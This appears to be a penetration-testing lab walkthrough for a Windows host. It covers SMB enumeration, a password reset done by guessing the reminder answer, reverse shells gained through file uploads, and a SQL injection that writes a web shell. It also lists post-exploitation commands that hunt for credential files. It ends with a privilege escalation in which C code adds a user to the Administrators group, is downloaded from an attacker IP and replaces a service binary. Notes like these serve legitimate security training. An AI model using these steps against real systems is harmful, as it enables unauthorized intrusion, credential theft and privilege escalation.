    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
[!] Something weird happened on (192.168.162.127) Error occurs while reading from remote(104) on line 1015                   
[*] Closed 1 connections               

smbclient -L //192.168.162.127 -N          
session setup failed: NT_STATUS_ACCESS_DENIED



```

8. Port 33033

```
Site vist: Http site with userprofiles and login/password reset forms.

http://192.168.162.127:33033/users/reminder

Was able to use user: jerrin.devops and guessed reminder: paranoid to reset password. 

```

8. Possible Exploits

```
1. http://192.168.162.127:8000/private/manage/photo/upload.lsp
	- Upload reverse .lsp reverse shell
2. http://192.168.162.127:8000/fs/C/xampp/htdocs/
    - Upload reverse .php shell
3. http://192.168.162.127:33033
```

8. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps For First Two 

```
1.  http://192.168.162.127:8000/private/manage/photo/upload.lsp
	- Successfully tested that I could upload file.
	- Downloaded .lsp reverse shell from https://github.com/the-emmons/lsp-reverse-shell
	- sudo impacket-smbserver SMB . -comment share -ts -debug -smb2support -username user -password 'pass'
	- http://192.168.162.127:8000/images/rev.lsp
	- Received reverse shell as nt authority\system

2.  http://192.168.162.127:8000/fs/C/xampp/htdocs/
    - Successfully tested that I could upload file.
    - Downloaded the .php reverse shell from https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
   - Uploaded edited .php file.
   - http://192.168.162.127:45332/php_reverse_shell.php
    - Received reverse shell as medjed\jerre

```

2. Exploit Steps for SQLi on http://192.168.162.127:33033/slug?URL=test.
 
	- Navigated to http://192.168.162.127:33033
	![[Users_WebPage 2.png]]
	
	- Clicked on reset password link and used the Jerren.devops username and a guessed reminder 'paranoid' to reset password to 'password'.
	![[Password_Reset.png]]	
	- Found possible SQLI at https://192.168.162.127:33033/Slug/?URL=
	![[possible_sqli.png]]
	
	- After trial and error found that I could use UNION SELECT and the INTO OUTFILE function to test saving an exploit to C:\xampp\htdocs. 
	![[possible_sqli_exploit 1.png]]
	
	- Visited http://192.168.162.127:45331/shell.php?cmd=whoami to test exploit.
	![[exploit_proof.png]]
	
	- Created Powershell reverse shell.
	![[short_PS_RS.png]]
	- Encoded reverse shell.
	![[encoded_rev_shell.png]]
	
	- Launched reverse shell.
	![[running_rev_shell.png]]
	
3. Shell Access

```

```

**Post-Exploitation**

1. Basic System Info

```
#CMD
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ver
echo %USERNAME%
echo %COMPUTERNAME%
echo %USERDOMAIN%
set
wmic os get Caption,Version,BuildNumber,OSArchitecture
wmic computersystem get Model,Manufacturer,SystemType
wmic qfe get HotFixID,InstalledOn

#Powershell
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
Get-ComputerInfo
Get-WmiObject Win32_OperatingSystem
Get-WmiObject Win32_ComputerSystem
Get-HotFix

```

2. User Enumeration

```
#CMD
net user
net user <username>
net localgroup
net localgroup administrators
query us

#Powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-ADUser -Filter *    (domain joined)
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
whoami /all


```

3. Network Information

```
#CMD
ipconfig /all
arp -a
route print
netstat -ano
net use
net share
net session
nltest /domain_trusts
nltest /dsgetdc:<domain>

#Powershell
Get-NetIPConfiguration
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection
Get-SmbShare
Get-SmbSession
Resolve-DnsName <hostname>
```

4. Software, Service, and Process Information

```
#CMD
wmic product get name,version
wmic product where "Vendor like '%Microsoft%'" get Name,Version
dir "C:\Program Files"
dir "C:\Program Files (x86)"

sc query
sc qc <service_name>
wmic service list brief
wmic service get name,displayname,pathname,startmode

tasklist
tasklist /v
tasklist /svc
wmic process list brief

#Powershell
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
Get-Package

Get-Service
Get-WmiObject Win32_Service | Select Name,StartMode,State,PathName
Get-Service | Where-Object {$_.Status -eq "Running"}

Get-Process
Get-Process -IncludeUserName
Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath

```

4. Loot files.
```
# CMD
dir C:\
dir C:\Users
dir C:\Users\<user>\Desktop
dir C:\Users\<user>\Documents
dir C:\Users\<user>\Downloads
dir C:\Users\<user>\AppData\Roaming
dir C:\Users\<user>\AppData\Local
dir C:\inetpub\wwwroot
dir C:\xampp
dir C:\wamp

dir /s /b *.txt *.ini *.cfg *.conf *.xml *.log *.bak *.ps1 *.kdbx *.rdp *.ppk *.pem

#Powershell
Get-ChildItem C:\Users -Recurse -Include *.txt,*.ini,*.cfg,*.xml,*.kdbx -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction SilentlyContinue



```

5. Automated Enumeration

```




```
5. Possible PE Paths

```

1. https://www.exploit-db.com/exploits/48789

```

**Privilege Escalation**

1. PE Steps

-  Found exploit for BarracudaDrive v6.5 - Insecure Folder Permissions at https://www.exploit-db.com/exploits/48789.
-  Checked permissions for bd folder.

```
icacls C:\bd
```

![[Pasted image 20260108135334.png]]
- Checked permission for bd.exe

```
icacls C:\bd\bd.exe
```

![[Pasted image 20260108135531.png]]

- Created malicious Windows executable to add current user 'jarren' to admin group and compiled.

```
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

int main(void){
        system("net localgroup Administrators jerren /add");
        WinExec("C:\\bd\\bd.service.exe",0);
return 0;
} 

i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o bd.exe
```

- Copied malicious file to Windows host. 

```
iwr -uri http://192.168.45.151/bd.exe -Outfile bd.exe
```

- Replaced the bd.exe with malicious bd.exe.

```
PS C:\bd> mv bd.exe bd2.exe
PS C:\bd> mv C:\xampp\htdocs\bd.exe .
```

- Rebooted.

```
shutdown -r -t 1

```

- Verified that jerren is now an admin.

![[Pasted image 20260108141615.png]]
